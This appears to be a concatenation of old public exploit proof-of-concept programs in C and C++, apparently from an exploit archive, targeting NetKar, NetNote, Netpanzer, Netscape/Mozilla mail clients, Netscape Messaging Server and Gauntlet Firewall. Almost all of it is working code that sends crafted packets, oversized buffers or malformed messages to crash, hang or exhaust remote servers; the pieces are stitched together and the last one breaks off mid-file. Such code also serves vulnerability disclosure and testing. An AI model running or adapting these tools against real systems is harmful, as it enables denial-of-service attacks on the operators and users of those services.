    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
    #define stricmp strcasecmp
    #define strnicmp strncasecmp
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        9500
#define BUFFSZ      1000    // max packet size



void fgetz(u8 *data, int len);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int putcc(u8 *buff, int chr, int len);
int putsx(u8 *buff, u8 *data, int len);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  linger  ling = {1,1};
    struct  sockaddr_in peer;
    int     sd,
            bug,
            len,
            ver     = 113;
    u16     port    = PORT;
    u8      buff[BUFFSZ],
            pass[0x18 + 1] = "",
            *host,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "NetKar <= 1.1 (1.0.3) buffer-overflow and NULL pointer "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <bug> <host> [port(%hu)]\n"
            "\n"
            "Bugs:\n"
            " 1 = buffer-overflow\n"
            " 2 = NULL pointer\n"
            "\n", argv[0], port);
        exit(1);
    }

    bug  = atoi(argv[1]);
    host = argv[2];
    if(argc > 3) port = atoi(argv[3]);

    peer.sin_addr.s_addr  = resolv(host);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

redo:
    p = buff;
    *p++ = 0x14;
    if(bug == 1) {
        printf("\n- test buffer-overflow (try version %d)\n", ver);
        p += putcc(p, 'a', BUFFSZ - 1);
    } else if(bug == 2) {
        printf("\n- test NULL pointer (try version %d)\n", ver);
        p += putsx(p, "account_<>?:", 0x40);
        p += putsx(p, "username",   0x15);
        p += putsx(p, "team",       0x15);
        p += putsx(p, "",           0x10);
        p += putsx(p, "model",      0x10);
        p += putxx(p, 81,           16);    // race number
        p += putxx(p, 0,            32);    // version, done later
        p += putxx(p, 60,           8);     // bandwidth
        p += putsx(p, "",           0x18);  // password and admin password (the same), done later
        p += putxx(p, (int)0.265000,32);
        p += putxx(p, (int)0.280000,32);
        p += putsx(p, "AV_FormulaRG_Front.nkt", 0x20);
        p += putsx(p, "AV_FormulaRG_Rear.nkt", 0x20);
        p += putxx(p, 0,            32);
        p += putsx(p, "italy",      0x30);
    } else {
        printf("\nError: invalid bug number (%d)\n", bug);
        exit(1);
    }
    putxx(buff + 0x8d, ver,         32);
    putsx(buff + 0x92, pass,        0x18);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
    send_recv(sd, buff, p - buff, NULL, 0, &peer, 1);
    if(ver == 113) {    // test previous version too, because doesn't reply if different
        putxx(buff + 0x8d, 107, 32);
        send_recv(sd, buff, p - buff, NULL, 0, &peer, 1);
        putxx(buff + 0x8d,  11, 32);
        send_recv(sd, buff, p - buff, NULL, 0, &peer, 1);
    }
    len = send_recv(sd, NULL, 0, buff, BUFFSZ, &peer, 0);
    close(sd);
    if(len > 0) {
        if((buff[0] == 0x6c) && !strnicmp(buff + 1, "Client software not updated", 27)) {
            ver++;
            goto redo;
        }
        if((buff[0] == 0x6c) && !strnicmp(buff + 1, "Client software is newer", 24)) {
            ver--;
            goto redo;
        }
        if(buff[0] == 0x1b) {
            printf("\n- invalid password, insert the correct keyword:\n  ");
            fgetz(pass, sizeof(pass));
            goto redo;
        }
    }

    printf("\n- check the server manually for verifying if it's vulnerable or not\n");
    return(0);
}



void fgetz(u8 *data, int len) {
    u8      *p;

    fgets(data, len, stdin);
    for(p = data; *p && (*p != '\n') && (*p != '\r'); p++);
    *p = 0;
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry,
            len;

    if(in && !out) {
        fputc('.', stdout);
        if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
          < 0) goto quit;
        return(0);
    }
    if(in) {
        for(retry = 2; retry; retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!timeout(sd, 1)) break;
        }

        if(!retry) {
            if(!err) return(-1);
            printf("\nError: socket timeout, no reply received\n\n");
            exit(1);
        }
    } else {
        if(timeout(sd, 3) < 0) return(-1);
    }

    fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int putcc(u8 *buff, int chr, int len) {
    memset(buff, chr, len);
    return(len);
}



int putsx(u8 *buff, u8 *data, int len) {
    strncpy(buff, data, len);
    return(len);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = num >> (i << 3);
    }
    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*



NetNote Server v2.2 build 230, crafted string vulnerability.
Poc included crash the server.

Full disclosure and poc exploit 
by class101 [at] DFind.kd-team.com [&] #n3ws [at] EFnet
13 november 2004

------------------
WHAT IS NETNOTE
------------------

Homepage - http://www.alshare.com/
	
	NetNote is the most complete free electronic note software.
	NetNote has been created to improve your productivity by integrating several
	unique features with an easy-to-use and nice-looking interface.
	Also called sticky-note utility, this Windows freeware targets SOHO 
	and medium size businesses as well as the Health community.
	It has network capabilities (send and receive notes, Instant Messaging),
	text notes, audio attachments, alarms and models (templates). 
	It also supports the latest Windows XP features as transparency and XP themes.
	The 5.0 version contains several features asked by the Health community 
	(veterinarians, physicians and dentists). 
	For example, NetNote is now integrated with AVImark, the leading veterinarian software.


--------------
VULNERABILITY
--------------

	A special string submitted to the server will cause an access violation... 

----
FIX
----

	Actually none, the vendor is contacted.

----
EXTRA
----
   
	Tested on Win2k Server SP4 and WinXP Pro SP1.
	This shouldn't be more exploitable, else code something 
	to show me that Im wrong :->

----
BY
----

    class101 [at] DFind.kd-team.com [&] #n3ws [at] EFnet
						 who
					   F.U.C.K
    K-OTik.com displaying the half part of codes they receive
	(also some other friends to me noticed it..., another ie: 
	JPEG Exploits, 6 or 7 mirrors displayed, poor assh0les...)

				  milw0rm.com rules!
*/

#include "winsock2.h"
#include "fstream.h"

#pragma comment(lib, "ws2_32")


static char payload[100];

char crash[]="\x90\x90\x90\x90\x20\x20\x20\x20";

void usage(char* us);
WSADATA wsadata;
void ver();

int main(int argc,char *argv[])
{
	ver();
	if ((argc<3)||(argc>4)||(atoi(argv[1])<1)||(atoi(argv[1])>1)){usage(argv[0]);return -1;}
	if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){cout<<"[+] wsastartup error: "<<WSAGetLastError()<<endl;return -1;}
	int ip=htonl(inet_addr(argv[2])), port;
	if (argc==4){port=atoi(argv[3]);}
	else port=6123;
	SOCKET s;
	struct fd_set mask;
	struct timeval timeout; 
	struct sockaddr_in server;
	s=socket(AF_INET,SOCK_STREAM,0);
	if (s==INVALID_SOCKET){ cout<<"[+] socket() error: "<<WSAGetLastError()<<endl;WSACleanup();return -1;}
	server.sin_family=AF_INET;
	server.sin_addr.s_addr=htonl(ip);
	server.sin_port=htons(port);
	WSAConnect(s,(struct sockaddr *)&server,sizeof(server),NULL,NULL,NULL,NULL);
	timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
	switch(select(s+1,NULL,&mask,NULL,&timeout))
	{
		case -1: {cout<<"[+] select() error: "<<WSAGetLastError()<<endl;closesocket(s);return -1;}
		case 0: {cout<<"[+] connect() error: "<<WSAGetLastError()<<endl;closesocket(s);return -1;}
		default:
		if(FD_ISSET(s,&mask))
		{
			cout<<"[+] connected, sending the bad string..."<<endl;
			Sleep(1000);
			if (atoi(argv[1]) == 1){strcat(payload,crash);}
			strcat(payload,"\r\n");
			Sleep(1000);
		    if (send(s,payload,strlen(payload),0)==SOCKET_ERROR) { cout<<"[+] sending error, the server prolly rebooted."<<endl;return -1;}
			Sleep(1000);
			if (atoi(argv[1]) == 1){cout<<"[+] payload send, the NetNote server should be crashed."<<endl;}
			return 0;
		}
	}
	closesocket(s);
	WSACleanup();
	return 0;
}


void usage(char* us) 
{  
	cout<<"USAGE: 101_netn.exe Method Ip Port\n"<<endl;
	cout<<"TARGETS:                               "<<endl;
	cout<<"      [+] 1. Crash NetNote Server  (*)"<<endl;
	cout<<"NOTE:                               "<<endl;
	cout<<"      The port 6123 is default if no port are specified"<<endl;
	cout<<"      The exploit crash the server."<<endl;
	cout<<"      A wildcard (*) mean Tested."<<endl;
	return;
} 

void ver()
{	
cout<<endl;
cout<<"                                                                   "<<endl;
cout<<"        ===================================================[v0.1]===="<<endl;
cout<<"        ===NetNote Server v2.2, Free Electronic Notes for Windows===="<<endl; 
cout<<"        ========Remote Crafted String Vulnerability=================="<<endl;
cout<<"        ====coded by class101===========[DFind.kd-team.com 2004]====="<<endl;
cout<<"        ============================================================="<<endl;
cout<<"                                                                   "<<endl;
}


// milw0rm.com [2004-11-13]
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

// included winerr.h /str0ke

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER         "0.1"
#define PORT        3030
#define TIMEOUT     5



int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd;
    u_short port = PORT;


#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "Netpanzer <= 0.8 endless loop "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    fputs("- check server: ", stdout);
    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    if(timeout(sd) < 0) {
        fputs("\nError: server doesn't seem to work, I have received no data\n\n", stdout);
        exit(1);
    } else {
        fputs("ok\n", stdout);
    }

    fputs("- send malformed data size\n", stdout);
    if(send(sd, "\x00\x00", 2, 0)
      <= 0) std_err();
    close(sd);

    fputs("- check server status:\n", stdout);
    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }

    close(sd);
    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


// milw0rm.com [2005-07-14]
source: http://www.securityfocus.com/bid/5002/info

The Netscape Communicator and Mozilla browsers include support for email, and the ability to fetch mail through a POP3 server. Both products are available for a range of platforms, including Microsoft Windows and Linux.

Under some circumstances, malformed email messages may prevent Netscape and Mozilla clients from accessing POP3 mailboxes. In particular, users will be unable to access more recent messages or delete the malicious email. 

/* this is the code that comes with my
 * advisory #1 to illustrate this...
 * eldre8 at afturgurluk (double dot minus one) org
 */

#include
#include
#include
#include
#include
#include
#include
#include

#define MX "localhost"
#define EHLO "EHLO mx\r\n"
#define MAIL "MAIL FROM: root@localhost\r\n"
#define RCPT "RCPT TO: root@localhost\r\n"
#define DATA "DATA\r\n"
#define QUIT "QUIT\r\n"

#define PORT 25

int sock;
char buffer[255];

void SigCatch() {
    fprintf(stderr, "\b\bbye!\n");
    close(sock);
    exit(0);
}

int main() {
    /* I was too lame to implement the command line... :) */
    int i;
    struct sockaddr_in sout;
    struct hostent *hp;

    signal(SIGINT, SigCatch);

    hp=gethostbyname(MX);
    sock=socket(AF_INET, SOCK_STREAM, 0);
    if (sock<0) {
        perror("sock");
        return -1;
    }

    sout.sin_family=AF_INET;
    sout.sin_port=htons(PORT);
    memcpy(&(sout.sin_addr), *(hp->h_addr_list), sizeof(struct in_addr));
    if (connect(sock, &sout, sizeof(sout))<0) {
        perror("connect");
        return -1;
    }
    recv(sock, buffer, 255, 0); /* receive the banner... */
    send(sock, EHLO, sizeof(EHLO), 0);
    recv(sock, buffer, 255, 0); /* receive the welcome message... */
    send(sock, MAIL, sizeof(MAIL), 0);
    recv(sock, buffer, 255, 0); /* receive the acknowledgement to mail from. */
    send(sock, RCPT, sizeof(RCPT), 0);
    recv(sock, buffer, 255, 0); /* idem, but for the rcpt to... */
    send(sock, DATA, sizeof(DATA), 0);
    recv(sock, buffer, 255, 0);
    i=sprintf(buffer, "b4d maIl 1n 4KT1oN!\n\x0a\x0d\x2e\x0d\x20\x0a\x0a\nblabla...\x0a\x20");
    *(buffer+i)="\x0";
    sprintf(buffer+i+1, "\n.\n");
    send(sock, buffer, i+1+3, 0); /* send the dumb thing ... */
    recv(sock, buffer, 255, 0);
    send(sock, QUIT, sizeof(QUIT), 0);
    recv(sock, buffer, 255, 0);
    close(sock);

    return 0;
}

source: http://www.securityfocus.com/bid/748/info

Netscape Messaging server will not de-allocate memory that is used to store the RCPT TO information for an incoming email. By sending enough long RCPT TO addresses, the system can be forced to consume all available memory, leading to a denial of service. 

/***************************************************************
 You can test "YOUR" Netscape Messaging Server 3.6SP2 for NT
 whether vulnerable for too much RCPT TO or not. 
                  by Nobuo Miwa, LAC Japan  28th Oct. 1999 
                  http://www.lac.co.jp/security/ 
****************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define    STR_HELO      "HELO rcpt2\n"
#define    STR_MAILFROM  "MAIL FROM:rcpt2\n"
#define    RCPT2_LENGTH  8000
#define    RCPT2_NUMBER  10000

int openSocket(struct sockaddr_in *si, char *hostIPaddr)
{
    int             port=25, sd, rt ;
    long            li ;
    struct hostent  *he;

    si->sin_addr.s_addr = inet_addr(hostIPaddr);
    si->sin_family      = AF_INET;
    si->sin_port        = htons (port);
    sd = socket (si->sin_family, SOCK_STREAM, 0);
    if (sd == -1) return (-1);

    rt = connect(sd,(struct sockaddr *)si,sizeof(struct sockaddr_in));
    if ( rt < 0 ) {
       close(sd);
       return(-1);
    }

    return(sd) ;
}

void sendRCPT2(int sd)
{
    char    rcptStr[RCPT2_LENGTH], tmpStr[RCPT2_LENGTH+80], strn[80];
    int     rt, i;

    memset( tmpStr, 0, sizeof(tmpStr) ) ;
    recv( sd, tmpStr, sizeof(tmpStr), 0 );
    printf("%s",tmpStr);  

    printf("%s",STR_HELO);
    send( sd, STR_HELO, strlen(STR_HELO), 0 );
    memset( tmpStr, 0, sizeof(tmpStr) ) ;
    rt = recv( sd, tmpStr, sizeof(tmpStr), 0 );
    if ( rt>0 ) printf("%s",tmpStr);

    printf("%s",STR_MAILFROM);
    send(sd, STR_MAILFROM, strlen(STR_MAILFROM), 0);
    memset( tmpStr, 0, sizeof(tmpStr) ) ;
    rt = recv(sd, tmpStr, sizeof(tmpStr), 0);
    if ( rt>0 ) printf("%s",tmpStr);

    strcpy( rcptStr, "RCPT TO: rcpt2@" ) ;
    while ( RCPT2_LENGTH-strlen(rcptStr)>10 )
        strcat( rcptStr, "aaaaaaaaaa") ;
    strcat( rcptStr, "\n" );
    for ( i=0 ; i<RCPT2_NUMBER ; i++ ) {
        printf("No.%d RCPT TO:rcpt2@aaa.. len %d\n",i,strlen(rcptStr));
        send( sd, rcptStr, strlen(rcptStr), 0 );
        rt = recv( sd, tmpStr, sizeof(tmpStr)-1, 0 );
        strncpy( strn, tmpStr, 60 ) ;
        if ( rt>0 ) printf("%s \n",strn);
    }

    return;
}

int main (int argc, char *argv[])
{
    char                 hostIPaddr[80], *cc, *pfft;
    int                  sd = 0;
    struct sockaddr_in   si;

    printf("You can use ONLY for YOUR Messaging Server 3.6\n");
    if (argc != 2) {
        printf("Usage: %s IPaddress \n",argv[0]);
        exit(1);
    } else
        strcpy (hostIPaddr, argv[1]);

    sd = openSocket(&si,hostIPaddr);  

    if (sd < 1) {
        printf("failed!\n");
        exit(-1);
    }

    sendRCPT2( sd );
    close (sd);

    exit(0);
}











































































source: http://www.securityfocus.com/bid/556/info

There is a vulnerability in Gauntlet Firewall 5.0 which allows an attacker to remotely cause a denial of service. The vulnerability occurs because Gauntlet Firewall cannot handle a condition where an ICMP Protocol Problem packet's (ICMP_PARAMPROB) encapsulated IP packet has a random protocol field and certain IP options set. When this specially constructed packet ( [ICMP PARAMPROB][IP with random protocol code and some ip options] ) is sent THROUGH the Gauntlet Firewall (not to the firewall itself), the firewall will hang, looking for the packet in it's transparency tables.

The packet structure looks like this:

Begin Packet
------------------------------------------
[NORMAL IP HEADER]

[ICMP PARAMPROB HEADER]

-- encapsulated ip packet --

[IP HEADER]

(important fields in ip header)

ip_p = 98 (let's specify a protocol that doesn't exist)
ip_hl = 0xf (stuff options)


------------------------------------------
End Packet

An attacker would do the following:

Construct the [ip-icmp-ip] packet using a raw socket (SOCK_RAW) with the fields set accordingly, destination set to any machine behind the firewall.

Send the packet(s).

The number of packets that need to be sent depends on the platform (ie Sol on a Sparc vs BSDI).

The consequence of this vulnerability being exploited is the target Gauntlet 5.0 firewall being remotely locked up. It should be expected that an attacker would send packets with spoofed source addresses in the ip header making it difficult to trace. 

/*
 * Discovered and written by:  <godot@msg.net>          <- Send money to :-)
 *     aka     Mike Frantzen   <frantzen@expert.cc.purdue.edu>  <- Reply to
 *
 * Network Associates:  "Who's watching your network?"
 * MSG.net              "Who's watching the watchers?"
 *
 * This can be found online at http://www.msg.net/firewalls/tis/bland.c
 *
 * Description:
 *  If you know an IP that will be routed through a Gauntlet 5.0 Firewall,
 *  you can remotely lock up the firewall (tested against Solaris 2.6 and
 *  BSDI).  It locks up to the point that one packet will disable STOP-A
 *  (L1-A) on Sparcs and ~3-5 packets will disable Ctrl-Alt-Del on BSDI
 *  (Ctrl-Alt-Del still prompts Y/N but it never reboots).
 *
 *  **You can NOT send this to the Gauntlet's IP.  The packet must be one
 *  **that would go through the forwarding code.
 *
 *  If you are on local ether to the firewall, set it as your default route
 *  or otherwise send the packet to the firewall's MAC. 
 *
 *  The packet is parsed before the packet filtering rules in Gauntlet.  So
 *  the only known work-around is to ACL out ICMP type 12 at your screening
 *  router.
 *  Or you could switch to Gauntlet 5.5 which (in the beta) does not seem to
 *  be vulnerable -- but 5.5 introduces some new 'issues'.
 *
 *
 * Technical Description of the packet:
 *  The packet is an ICMP Paramater Problem packet that encapsulates an IP
 *  packet with IP Options.  There is a random protocol in the encapsulated
 *  IP packet.  The trick is:  the inner packet MUST have IP Options.  Some
 *  options work, some don't.
 *  The firewall apparently is looking for the packet (or an entry in its
 *  transparency table) that matches the encapsulated packet.  It just keeps
 *  looking....  It likely has interrupts masked off on Solaris.
 *
 * 
 * You need libnet to link this against.  It's a pretty spiffy lib.
 *   http://www.infonexus.com/~daemon9/Projects/Libnet
 *   http://www.packetfactory.net/libnet
 * 
 *
 * For da script kiddies:
 *   Compile with 'gcc -o bland bland.c -lnet'
 *   ./bland -d <ip through the firewall>
 *   (Did you remember to install Libnet???)
 *
 *
 * If it doesn't compile on your machine:  I DON'T CARE!!!  This program was
 * a quick and dirty hack.  You try reading a hexdump of a packet off the
 * wire and writing something that can reproduce it.
 * I know it compiles and works from FreeBSD 3.1 
 *
 *
 * Network Associates (TIS) was notified two weeks ago and they are working
 * on a patch.
 *
 *
 * Plugs:
 *  ISIC --  Program I used (and wrote) to find bugs in Gauntlet's IP stack.
 *           http://expert.cc.purdue.edu/~frantzen/isic-0.02.tar.gz
 *  Libnet --  Was able to write the basic exploit in 20 minutes because of
 *           libnet.  See libnet link above.  Thanks go out to Route!
 *
 *
 * Credits:
 *  Mike Frantzen <frantzen@expert.cc.purdue.edu>	Hey, thats me!
 *  Mike Scher <strange@cultural.com>
 *  Kevin Kadow <kadokev@msg.net>	      <-  Gauntlet Random Seed Hole
 *  Lenard Lynch <llynch@tribune.com>
 *  Viki Navratilova <vn@msg.net>
 */

#include <libnet.h>

int main(int argc, char **argv)
{
	u_long src_ip = 0, dst_ip = 0, ins_src_ip = 0, ins_dst_ip = 0;
	u_long *problem = NULL;
	u_char *packet = NULL;
	int sock, c, len = 0;
	long acx, count = 1;
	struct icmp *icmp;
	struct ip *ip;

	/* It appears that most IP options of length >0 will work
	 * Works with 128, 64, 32, 16...  And the normal ones 137... 
	 * Does not work with 0, 1 */
	u_char data[] = {137};
	int data_len = sizeof(data);

	printf("Written by Mike Frantzen...  <godot@msg.net>\n");
	printf("For test purposes only... yada yada yada...\n");

	src_ip = inet_addr("10.10.10.10");

	while ( (c = getopt(argc, argv, "d:s:D:S:l:c:")) != EOF ) {
	  switch(c) {
		case 'd':	dst_ip = libnet_name_resolve(optarg, 1);
				break;
		case 's':	src_ip = libnet_name_resolve(optarg, 1);
				break;
		case 'D':	ins_dst_ip = name_resolve(optarg, 1);
				break;
		case 'S':	ins_src_ip = name_resolve(optarg, 1);
				break;
		case 'l':	data_len = atoi(optarg);
				break;
		case 'c':	if ( (count = atol(optarg)) < 1)
					count = 1;
				break;
		default:	printf("Don't understand option.\n");
				exit(-1);
	  }
	}

	if ( dst_ip == 0 ) {
	    printf("Usage: %s\t -d <destination IP>\t[-s <source IP>]\n",
		rindex(argv[0], '/') == NULL ? argv[0]
					: rindex(argv[0], '/') + 1);
	    printf("\t\t[-S <inner source IP>]\t[-D <inner dest IP>]\n");
	    printf("\t\t[-l <data length>]\t[-c <# to send>]\n");
	    exit(-1);
	}

	if ( ins_dst_ip == 0 )
		ins_dst_ip = src_ip;
	if ( ins_src_ip == 0 )
		ins_src_ip = dst_ip;

	if ( (packet = malloc(1500)) == NULL ) {
		perror("malloc: ");
		exit(-1);
	}
	if ( (sock = libnet_open_raw_sock(IPPROTO_RAW)) == -1 ) {
        	perror("socket: ");
        	exit(-1);
	}

	/* 8 is the length of the ICMP header with the problem field */
	len = 8 + IP_H + data_len;
	bzero(packet + IP_H, len);

        libnet_build_ip(len,                    /* Size of the payload */
                0xc2,                           /* IP tos */
                30241,                          /* IP ID */
                0,                              /* Frag Offset & Flags */
                64,                             /* TTL */
                IPPROTO_ICMP,                   /* Transport protocol */
                src_ip,                         /* Source IP */
                dst_ip,                         /* Destination IP */
                NULL,                           /* Pointer to payload */
                0,
                packet);                        /* Packet memory */


	/* ICMP Header for Parameter Problem
	 * --------------+---------------+---------------+---------------
	 *| Type (12)	 |    Code (0)	 |	Checksum		 |
	 * --------------+---------------+---------------+---------------
	 *| Pointer	 |		unused				 |
	 * --------------+---------------+---------------+---------------
	 * Internet Header + 64 bits of original datagram data....
	 */

	icmp = (struct icmp *) (packet + IP_H);
	problem = (u_long *) (packet + IP_H + 4);  /* 4 = ICMP header  */
	icmp->icmp_type	= ICMP_PARAMPROB;
	icmp->icmp_code	= 0;		/* Indicates a problem pointer */
	*problem = htonl(0x14000000);	/* Problem is 20 bytes into it */


	/* Need to embed an IP packet within the ICMP */
	ip = (struct ip *) (packet + IP_H + 8);	/* 8 = icmp header	*/
	ip->ip_v	= 0x4;			/* IPV4			*/
	ip->ip_hl	= 0xf;			/* Some IP Options	*/
	ip->ip_tos	= 0xa3;			/* Whatever		*/
	ip->ip_len	= htons(data_len);	/* Length of packet	*/
	ip->ip_id	= 30241;		/* Whatever		*/
	ip->ip_off	= 0;			/* No frag's		*/
	ip->ip_ttl	= 32;			/* Whatever		*/
	ip->ip_p	= 98;			/* Random protocol	*/
	ip->ip_sum	= 0;			/* Will calc later	*/
	ip->ip_src.s_addr = ins_src_ip;
	ip->ip_dst.s_addr = ins_dst_ip;

	/* Move our data block into the packet */
	bcopy(data, (void *) (packet + IP_H + IP_H + 8), data_len);

	/* I hate checksuming.  Spent a day trying to get it to work in
	 * perl...  That sucked...  Tequilla would have helped immensly.
	 */
	libnet_do_checksum((unsigned char *) ip, IPPROTO_IP, data_len);

	/* Bah...  See above comment.... */
	libnet_do_checksum(packet, IPPROTO_ICMP, len);


	printf("Sending %li packets", count);
	for (acx = 0; acx < count; acx++) {
	   if( libnet_write_ip(sock, packet, len + IP_H)  < (len + IP_H))
 		perror("write_ip: ");
	   else printf(".");
	}
	printf("\n\n");
	return( 0 );
}

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
